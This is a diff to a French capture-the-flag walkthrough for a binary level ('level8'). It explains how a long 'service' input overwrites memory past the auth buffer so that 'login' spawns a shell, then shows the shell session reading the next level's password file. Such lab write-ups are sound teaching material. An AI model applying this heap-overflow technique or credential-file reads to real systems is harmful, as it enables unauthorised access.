@@ -376,13 +376,57 @@
 ## Exploit
 
 Après l'analyse de ce (~trop~ très) long main ( •̀ - •́ ) ***angry norminette noises*** ( •̀ - •́ ), on comprend plusieurs choses:
-- On peut interagir avec le programme avec différentes commandes:
-  - "auth "
-    - si l'input qui suit la commande est moins long que 30 caractères, copie son contenu dans la globale <auth>
-  - "reset"
-    - free la gloable <auth>
-  - "service"
-    - strdup l'input qui suit la commande dans la globale <service>
-  - "login"
-    - si le 33eme caractere de la globale auth != 0, pop un shell avec la commande system()
-    - sinon, écrit "Password:\n" sur la sortie standard
+- A chaque tour de boucle, le programme:
+  - Affiche les adresses de auth et service, sous le format `(&auth), (&service)` ()
+  - Attend une de ces commandes sur l'entrée standard:
+    - "auth "
+      - si l'input qui suit la commande est moins long que 30 caractères, copie son contenu dans la globale <auth>
+    - "reset"
+      - free la gloable <auth>
+    - "service"
+      - strdup l'input qui suit la commande dans la globale <service>
+    - "login"
+      - si auth[32] != 0, pop un shell avec la commande system()
+      - sinon, écrit "Password:\n" sur la sortie standard
+          
+- `./level8`
+  ```
+  (nil), (nil)
+          
+  ```
+  - `auth `
+    ```
+    0x804a008, (nil)
+    ```
+  - `service`
+    ```
+    0x804a008, 0x804a018
+    ```
+  - `login`
+    ```
+    Password:
+    0x804a008, 0x804a018
+    ```
+L'objectif est d'écrire quelque chose à l'adresse auth +32 pour que sa valeur ne soit pas null et que login nous ouvre le shell.
+Le strcpy() de auth est protégé par un strlen() de max 30, mais le strdup de service (qui se trouve à auth + 0x10 = 16) ne l'est pas, il nous suffit donc d'écrire au moins 15 caractères en input de service pour écrire à &service + 16 == &auth + 32.
+- `./level8`
+  ```
+  (nil), (nil)
+          
+  ```
+  - `auth `
+    ```
+    0x804a008, (nil)
+    ```
+  - `service AAAAAAAAAAAAAAA`
+    ```
+    0x804a008, 0x804a018
+    ```
+  - `login`
+    ```
+    $
+    $ whoami
+    level9
+    $ cat /home/user/level9/.pass
+    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+    ```
